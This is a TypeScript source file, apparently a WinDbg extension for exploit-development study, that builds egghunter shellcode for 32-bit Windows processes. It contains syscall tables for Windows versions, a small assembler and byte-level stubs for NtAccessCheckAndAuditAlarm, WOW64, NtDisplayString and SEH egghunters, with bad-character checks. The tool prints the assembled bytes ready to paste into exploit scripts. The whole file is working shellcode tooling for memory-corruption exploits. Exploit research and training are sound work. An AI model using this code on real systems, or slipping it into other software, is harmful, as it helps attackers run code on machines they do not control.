import { Command, CommandResult } from "../core/registry";
import * as out from "../core/output";

type EggMode = "ntaccess" | "ntdisplay" | "seh";

type EggOptions = {
  tag: string;
  mode: EggMode;
  wow64: boolean;
  badchars: number[];
  os: string | null;
  syscall: number | null;
};

type OsRow = {
  key: string;
  label: string;
  builds: string[];
  // NtAccessCheckAndAuditAlarm on a native 32-bit kernel (int 0x2e stub).
  ntaccess32?: number;
  // NtAccessCheckAndAuditAlarm on a 64-bit kernel, reached from WOW64 through fs:[0xC0].
  ntaccess64?: number;
  // NtDisplayString on a native 32-bit kernel.
  ntdisplay32?: number;
};

// Syscall numbers from j00ru's Windows syscall tables:
// https://j00ru.vexillium.org/syscalls/nt/32/ and https://j00ru.vexillium.org/syscalls/nt/64/
// (data: https://github.com/j00ru/windows-syscalls, x86 and x64 nt-per-syscall.json).
// ntaccess64 is listed only for Windows 10 and 11: earlier WOW64 gates take the
// argument pointer in edx and a thunk index in ecx, which the WOW64 stub does not set.
const OS_TABLE: OsRow[] = [
  { key: "xp", label: "Windows XP", builds: ["2600"], ntaccess32: 0x02, ntdisplay32: 0x43 },
  { key: "2003", label: "Windows Server 2003", builds: ["3790"], ntaccess32: 0x02, ntdisplay32: 0x46 },
  { key: "vista", label: "Windows Vista", builds: ["6000", "6001", "6002"], ntaccess32: 0x02, ntdisplay32: 0x80 },
  { key: "win7", label: "Windows 7", builds: ["7600", "7601"], ntaccess32: 0x02, ntdisplay32: 0x6d },
  { key: "win8", label: "Windows 8", builds: ["9200"], ntaccess32: 0x1aa, ntdisplay32: 0x131 },
  { key: "win8.1", label: "Windows 8.1", builds: ["9600", "win81"], ntaccess32: 0x1af, ntdisplay32: 0x135 },
  { key: "win10-1507", label: "Windows 10 1507", builds: ["10240"], ntaccess32: 0x1b7, ntaccess64: 0x29, ntdisplay32: 0x13a },
  { key: "win10-1511", label: "Windows 10 1511", builds: ["10586"], ntaccess32: 0x1ba, ntaccess64: 0x29, ntdisplay32: 0x13c },
  { key: "win10-1607", label: "Windows 10 1607", builds: ["14393"], ntaccess32: 0x1bc, ntaccess64: 0x29, ntdisplay32: 0x13e },
  { key: "win10-1703", label: "Windows 10 1703", builds: ["15063"], ntaccess32: 0x1c2, ntaccess64: 0x29, ntdisplay32: 0x141 },
  { key: "win10-1709", label: "Windows 10 1709", builds: ["16299"], ntaccess32: 0x1c6, ntaccess64: 0x29, ntdisplay32: 0x144 },
  { key: "win10-1803", label: "Windows 10 1803", builds: ["17134"], ntaccess32: 0x1c6, ntaccess64: 0x29, ntdisplay32: 0x144 },
  { key: "win10-1809", label: "Windows 10 1809", builds: ["17763"], ntaccess32: 0x1c6, ntaccess64: 0x29, ntdisplay32: 0x143 },
  { key: "win10-1903", label: "Windows 10 1903", builds: ["18362"], ntaccess32: 0x1c6, ntaccess64: 0x29, ntdisplay32: 0x143 },
  { key: "win10-1909", label: "Windows 10 1909", builds: ["18363"], ntaccess32: 0x1c6, ntaccess64: 0x29, ntdisplay32: 0x143 },
  { key: "win10-2004", label: "Windows 10 2004", builds: ["19041"], ntaccess32: 0x1c8, ntaccess64: 0x29, ntdisplay32: 0x143 },
  { key: "win10-20h2", label: "Windows 10 20H2", builds: ["19042"], ntaccess32: 0x1c8, ntaccess64: 0x29, ntdisplay32: 0x143 },
  { key: "win10-21h1", label: "Windows 10 21H1", builds: ["19043"], ntaccess32: 0x1c8, ntaccess64: 0x29, ntdisplay32: 0x143 },
  { key: "win10-21h2", label: "Windows 10 21H2", builds: ["19044"], ntaccess32: 0x1c9, ntaccess64: 0x29, ntdisplay32: 0x143 },
  { key: "win10-22h2", label: "Windows 10 22H2", builds: ["19045", "win10"], ntaccess32: 0x1c9, ntaccess64: 0x29, ntdisplay32: 0x143 },
  { key: "win11", label: "Windows 11", builds: ["22000", "22621", "22631", "26100", "26200"], ntaccess64: 0x29 },
];

type StubKind = "ntaccess32" | "ntaccess64" | "ntdisplay32";

const DEFAULT_OS: Record<StubKind, string> = {
  ntaccess32: "win10-22h2",
  ntaccess64: "win10-22h2",
  ntdisplay32: "xp",
};

const SERVICE_NAME: Record<StubKind, string> = {
  ntaccess32: "NtAccessCheckAndAuditAlarm",
  ntaccess64: "NtAccessCheckAndAuditAlarm",
  ntdisplay32: "NtDisplayString",
};

function findOs(name: string): OsRow | undefined {
  const needle = name.trim().toLowerCase();
  return OS_TABLE.find((row) => row.key === needle || row.builds.includes(needle));
}

function hex(value: number): string {
  return `0x${value.toString(16).toUpperCase()}`;
}

type ResolvedSyscall = { number: number; source: string; warning?: string };

function resolveSyscall(kind: StubKind, os: string | null, syscall: number | null): ResolvedSyscall {
  if (syscall !== null) {
    return { number: syscall, source: "explicit" };
  }
  const row = os === null ? undefined : findOs(os);
  const number = row?.[kind];
  if (row && number !== undefined) {
    return { number, source: row.label };
  }
  const fallback = findOs(DEFAULT_OS[kind])!;
  const fallbackNumber = fallback[kind]!;
  const known = OS_TABLE.filter((entry) => entry[kind] !== undefined).map((entry) => entry.key).join(", ");
  const reason = os === null
    ? "No os given"
    : row
      ? `No ${SERVICE_NAME[kind]} number for ${row.label} in this stub`
      : `Unknown os "${os}"`;
  return {
    number: fallbackNumber,
    source: fallback.label,
    warning: `${reason}; using ${hex(fallbackNumber)} (${fallback.label}). Pass os (${known}) or syscall, or read the number with u ntdll!${SERVICE_NAME[kind]} L1.`,
  };
}

// A stub is a list of instruction bytes, labels, and branches resolved against the
// labels, so the jump displacements follow the length of the syscall sequence.
type Asm =
  | number[]
  | { label: string }
  | { jcc: number; to: string } // short jump: opcode, rel8
  | { call: string } // call rel32
  | { gap: [string, string] }; // one byte: offset of the second label minus the first

function asmSize(item: Asm): number {
  if (Array.isArray(item)) return item.length;
  if ("label" in item) return 0;
  if ("jcc" in item) return 2;
  if ("call" in item) return 5;
  return 1;
}

function assemble(items: Asm[]): number[] {
  const labels = new Map<string, number>();
  let offset = 0;
  for (const item of items) {
    if (!Array.isArray(item) && "label" in item) labels.set(item.label, offset);
    offset += asmSize(item);
  }
  const at = (name: string): number => {
    const value = labels.get(name);
    if (value === undefined) throw new Error(`egghunter stub has no label ${name}`);
    return value;
  };
  const bytes: number[] = [];
  for (const item of items) {
    const next = bytes.length + asmSize(item);
    if (Array.isArray(item)) {
      bytes.push(...item);
    } else if ("jcc" in item) {
      const rel = at(item.to) - next;
      if (rel < -0x80 || rel > 0x7f) throw new Error(`short jump to ${item.to} out of range (${rel})`);
      bytes.push(item.jcc, rel & 0xff);
    } else if ("call" in item) {
      bytes.push(0xe8, ...dwordLE(at(item.call) - next));
    } else if ("gap" in item) {
      const gap = at(item.gap[1]) - at(item.gap[0]);
      if (gap < 1 || gap > 0x7f) throw new Error(`gap ${item.gap.join("-")} does not fit imm8 (${gap})`);
      bytes.push(gap);
    }
  }
  return bytes;
}

// Ways to load a syscall number into eax, null-free forms first. The stub takes the
// first one that avoids 0x00 and the bad characters, so the number never forces a null.
function movEaxCandidates(value: number): number[][] {
  const v = value >>> 0;
  const lo = v & 0xff;
  const hi = (v >>> 8) & 0xff;
  const candidates: number[][] = [];
  if (v === 0) candidates.push([0x31, 0xc0]); // xor eax, eax
  else if (v <= 0x7f) candidates.push([0x6a, v, 0x58]); // push imm8 ; pop eax
  else if (v <= 0xff) candidates.push([0x31, 0xc0, 0xb0, v]); // xor eax, eax ; mov al, imm8
  else if (v <= 0xffff && lo === 0) candidates.push([0x31, 0xc0, 0xb4, hi]); // xor eax, eax ; mov ah, imm8
  else if (v <= 0xffff) candidates.push([0x31, 0xc0, 0x66, 0xb8, lo, hi]); // xor eax, eax ; mov ax, imm16
  candidates.push([0xb8, ...dwordLE(v)]); // mov eax, imm32
  candidates.push([0xb8, ...dwordLE(~v >>> 0), 0xf7, 0xd0]); // mov eax, ~imm32 ; not eax
  return candidates;
}

function movEax(value: number, badSet: Set<number>): number[] {
  const candidates = movEaxCandidates(value);
  return candidates.find((c) => c.every((b) => b !== 0 && !badSet.has(b))) ?? candidates[0];
}

// NtAccessCheckAndAuditAlarm egghunter (INT 0x2E) for a native 32-bit kernel.
// Scans page by page using the syscall for access checks, then dword by dword
// with scasd for the doubled tag. 35 bytes for 0x1C9, 32 for 0x02.
function ntaccessX86(tag: number[], mov: number[]): Asm[] {
  return [
    { label: "page" },
    [0x66, 0x81, 0xca, 0xff, 0x0f], // or dx, 0x0fff
    { label: "addr" },
    [0x42],                         // inc edx
    [0x52],                         // push edx
    mov,                            // eax = syscall number
    [0xcd, 0x2e],                   // int 0x2e
    [0x3c, 0x05],                   // cmp al, 0x5
    [0x5a],                         // pop edx
    { jcc: 0x74, to: "page" },      // je page
    [0xb8, ...tag],                 // mov eax, <TAG>
    [0x8b, 0xfa],                   // mov edi, edx
    [0xaf],                         // scasd
    { jcc: 0x75, to: "addr" },      // jne addr
    [0xaf],                         // scasd
    { jcc: 0x75, to: "addr" },      // jne addr
    [0xff, 0xe7],                   // jmp edi
  ];
}

// WOW64 variant. int 0x2e in a WOW64 process raises STATUS_ILLEGAL_INSTRUCTION,
// so this stub calls the 64-bit service through the WOW64 gate at fs:[0xC0], as the
// 32-bit ntdll does on Windows 10 and 11 (mov eax, 0x29 ; call Wow64SystemServiceCall).
// The gate reads arguments from [esp+8]: the stub pushes the probed address twice
// (return-address slot and SubsystemName) above ten zeroed arguments, and gets
// STATUS_ACCESS_VIOLATION (al = 5) when the address is not readable. 49 bytes with 0x29.
function ntaccessWow64(tag: number[], mov: number[]): Asm[] {
  return [
    [0x33, 0xdb],                   // xor ebx, ebx
    [0x53, 0x53, 0x53, 0x53, 0x53], // push ebx x10 (zeroed arguments 2-11)
    [0x53, 0x53, 0x53, 0x53, 0x53],
    [0xb3, 0xc0],                   // mov bl, 0xc0
    { label: "page" },
    [0x66, 0x81, 0xca, 0xff, 0x0f], // or dx, 0x0fff
    { label: "addr" },
    [0x42],                         // inc edx
    [0x52],                         // push edx (SubsystemName = probed address)
    [0x52],                         // push edx (return-address slot)
    mov,                            // eax = syscall number
    [0x64, 0xff, 0x13],             // call dword ptr fs:[ebx]
    [0x5a],                         // pop edx
    [0x5a],                         // pop edx
    [0x3c, 0x05],                   // cmp al, 0x5
    { jcc: 0x74, to: "page" },      // je page
    [0xb8, ...tag],                 // mov eax, <TAG>
    [0x8b, 0xfa],                   // mov edi, edx
    [0xaf],                         // scasd
    { jcc: 0x75, to: "addr" },      // jne addr
    [0xaf],                         // scasd
    { jcc: 0x75, to: "addr" },      // jne addr
    [0xff, 0xe7],                   // jmp edi
  ];
}

// NtDisplayString egghunter (INT 0x2E). 32 bytes.
// Classic Skape variant with `push imm8 ; pop eax`. It only takes numbers that fit
// a signed byte (0x01-0x7F), which holds up to Windows 7; later builds need ntaccess.
function ntdisplayX86(tag: number[], syscall: number): Asm[] {
  return [
    { label: "page" },
    [0x66, 0x81, 0xca, 0xff, 0x0f], // or dx, 0x0fff
    { label: "addr" },
    [0x42],                         // inc edx
    [0x52],                         // push edx
    [0x6a, syscall, 0x58],          // push imm8 ; pop eax
    [0xcd, 0x2e],                   // int 0x2e
    [0x3c, 0x05],                   // cmp al, 0x5
    [0x5a],                         // pop edx
    { jcc: 0x74, to: "page" },      // je page
    [0xb8, ...tag],                 // mov eax, <TAG>
    [0x8b, 0xfa],                   // mov edi, edx
    [0xaf],                         // scasd
    { jcc: 0x75, to: "addr" },      // jne addr
    [0xaf],                         // scasd
    { jcc: 0x75, to: "addr" },      // jne addr
    [0xff, 0xe7],                   // jmp edi
  ];
}

// SEH-based egghunter. 67 bytes, null-free. No syscall number, so it is portable
// across Windows versions. It installs an exception handler that catches the access
// violation from scasd and resumes at the next page. The handler sits after a backward
// call, so the return address is the handler and the rel32 is negative instead of the
// zeros of call $+5. CONTEXT.Eip (offset 0xB8) is written as [ecx+0x7F+0x39] to keep
// the displacement byte-sized.
function sehX86(tag: number[]): Asm[] {
  return [
    { jcc: 0xeb, to: "getpc" },     // jmp short getpc
    { label: "install" },
    [0x5e],                         // pop esi (handler)
    [0x31, 0xd2],                   // xor edx, edx
    [0x56],                         // push esi (Handler)
    [0x64, 0xff, 0x32],             // push dword ptr fs:[edx] (Next = old SEH)
    [0x64, 0x89, 0x22],             // mov dword ptr fs:[edx], esp
    [0x31, 0xff],                   // xor edi, edi (scan from 0)
    { label: "page" },
    [0x66, 0x81, 0xcf, 0xff, 0x0f], // or di, 0x0fff (the handler resumes here)
    { label: "addr" },
    [0x47],                         // inc edi
    [0xb8, ...tag],                 // mov eax, <TAG>
    [0xaf],                         // scasd
    { jcc: 0x75, to: "addr" },      // jnz addr
    [0xaf],                         // scasd
    { jcc: 0x75, to: "addr" },      // jnz addr
    [0x64, 0x8f, 0x02],             // pop dword ptr fs:[edx] (restore old SEH)
    [0x83, 0xc4, 0x04],             // add esp, 4
    [0xff, 0xe7],                   // jmp edi
    { label: "getpc" },
    { call: "install" },            // call install (pushes the handler address)
    { label: "handler" },
    [0x8b, 0x4c, 0x24, 0x0c],       // mov ecx, [esp+0xc] (ContextRecord)
    [0x8b, 0x44, 0x24, 0x08],       // mov eax, [esp+0x8] (EstablisherFrame)
    [0x8b, 0x40, 0x04],             // mov eax, [eax+0x4] (Handler)
    [0x83, 0xe8], { gap: ["page", "handler"] }, // sub eax, handler - page
    [0x83, 0xc1, 0x7f],             // add ecx, 0x7f
    [0x89, 0x41, 0x39],             // mov [ecx+0x39], eax (CONTEXT.Eip = page)
    [0x31, 0xc0],                   // xor eax, eax (ExceptionContinueExecution)
    [0xc3],                         // ret
  ];
}

function uniqueBytes(values: number[] | undefined): number[] {
  const seen = new Set<number>();
  for (const v of values ?? []) {
    if (Number.isInteger(v) && v >= 0 && v <= 0xff) seen.add(v & 0xff);
  }
  return [...seen].sort((a, b) => a - b);
}

function checkBadchars(bytes: number[], label: string, badSet: Set<number>): string[] {
  const hits: string[] = [];
  for (let i = 0; i < bytes.length; i++) {
    if (badSet.has(bytes[i])) {
      hits.push(`byte 0x${bytes[i].toString(16).toUpperCase().padStart(2, "0")} at offset ${i} in ${label}`);
    }
  }
  return hits;
}

function tagBytes(tag: string): number[] {
  return tag.padEnd(4, "X").slice(0, 4).split("").map((c) => c.charCodeAt(0));
}

function dwordLE(val: number): number[] {
  return [val & 0xff, (val >> 8) & 0xff, (val >> 16) & 0xff, (val >> 24) & 0xff];
}

export type EgghunterResult = {
  bytes: number[];
  size: number;
  badcharHits: string[];
  syscallUsed: number | null;
  syscallSource: string | null;
  osWarning: string | null;
};


export function buildEgghunter(options: EggOptions): EgghunterResult {
  const tag = tagBytes(options.tag);
  const badSet = new Set(uniqueBytes(options.badchars));

  let items: Asm[];
  let label: string;
  let resolved: ResolvedSyscall | null = null;

  if (options.mode === "seh") {
    items = sehX86(tag);
    label = "seh egghunter";
  } else if (options.mode === "ntdisplay") {
    if (options.wow64) {
      throw new Error('ntdisplay has no WOW64 stub: int 0x2e raises STATUS_ILLEGAL_INSTRUCTION in a WOW64 process. Use mode "ntaccess" with wow64 = true.');
    }
    resolved = resolveSyscall("ntdisplay32", options.os, options.syscall);
    if (resolved.number < 0x01 || resolved.number > 0x7f) {
      throw new Error(`NtDisplayString number ${hex(resolved.number)} (${resolved.source}) does not fit the push imm8 in the ntdisplay stub (0x01-0x7F). Use mode "ntaccess".`);
    }
    items = ntdisplayX86(tag, resolved.number);
    label = "ntdisplay egghunter";
  } else if (options.wow64) {
    resolved = resolveSyscall("ntaccess64", options.os, options.syscall);
    items = ntaccessWow64(tag, movEax(resolved.number, badSet));
    label = "ntaccess wow64 egghunter";
  } else {
    resolved = resolveSyscall("ntaccess32", options.os, options.syscall);
    items = ntaccessX86(tag, movEax(resolved.number, badSet));
    label = "ntaccess egghunter";
  }

  const bytes = assemble(items);
  const badcharHits = checkBadchars(bytes, label, badSet);
  return {
    bytes,
    size: bytes.length,
    badcharHits,
    syscallUsed: resolved?.number ?? null,
    syscallSource: resolved?.source ?? null,
    osWarning: resolved?.warning ?? null,
  };
}

function bytesToHex(bytes: number[]): string {
  return bytes.map((v) => v.toString(16).toUpperCase().padStart(2, "0")).join("");
}

function bytesToPython(bytes: number[]): string {
  return `b"${bytes.map((v) => `\\x${v.toString(16).padStart(2, "0")}`).join("")}"`;
}

export function createEgghunterCommand(): Command {
  return {
    name: "egghunter",
    description: "Generate NtAccess/SEH egghunter stubs with badchar checking.",
    usage: "dx @$osed().egghunter(tag?, mode?, wow64?, badchars?, os?, syscall?)",
    examples: [
      'dx @$osed().egghunter("W00T", "ntaccess", false, "", "win10-1909")',
      'dx @$osed().egghunter("W00T", "ntaccess", true, "00 0A 0D", "win10")',
      'dx @$osed().egghunter("W00T", "ntaccess", false, "", "", 0x1c8)',
      'dx @$osed().egghunter("W00T", "ntdisplay", false, "00 0A 0D", "win7")',
      'dx @$osed().egghunter("B33F", "seh")',
    ],
    schema: {
      tag: { type: "string", default: "W00T" },
      mode: { type: "string", enum: ["ntaccess", "ntdisplay", "seh"], default: "ntaccess" },
      wow64: { type: "boolean", default: false },
      badchars: { type: "array", default: [] },
      os: { type: "string" },
      syscall: { type: "number", min: 0, max: 0xffffffff },
    },
    execute(options: Record<string, unknown>): CommandResult {
      const opts: EggOptions = {
        tag: (options.tag as string) ?? "W00T",
        mode: (options.mode as EggMode) ?? "ntaccess",
        wow64: (options.wow64 as boolean) ?? false,
        badchars: (options.badchars as number[]) ?? [],
        os: (options.os as string | undefined) || null,
        syscall: (options.syscall as number | undefined) ?? null,
      };

      const result = buildEgghunter(opts);

      out.section("Egghunter");
      const sysLabel = result.syscallUsed !== null ? ` | Syscall: ${hex(result.syscallUsed)} (${result.syscallSource})` : "";
      out.info(`Tag: ${opts.tag} | Mode: ${opts.mode}${opts.wow64 ? " (WoW64)" : ""} | Size: ${result.size} bytes${sysLabel}`);
      if (result.osWarning) {
        out.warn(result.osWarning);
      }
      out.print(bytesToHex(result.bytes));
      out.print(bytesToPython(result.bytes));
      if (result.badcharHits.length > 0) {
        for (const hit of result.badcharHits) {
          out.warn(`Badchar: ${hit}`);
        }
      }

      return {
        command: "egghunter",
        args: options,
        success: result.badcharHits.length === 0,
        findings: [result],
        warnings: result.osWarning ? [result.osWarning, ...result.badcharHits] : result.badcharHits,
        errors: [],
      };
    },
  };
}
